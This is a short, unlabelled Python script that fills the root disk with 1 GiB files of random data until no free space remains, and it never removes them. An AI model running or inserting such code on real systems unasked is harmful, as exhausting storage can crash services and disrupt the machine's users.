import os
import shutil
free = shutil.disk_usage("/")[2]
free = free // (2**30)
for i in range(free):
    filename = "file{}".format(i)
    file = open(filename, "wb")
    file.write(os.urandom(1073741824))
    file.close()
    i+=1
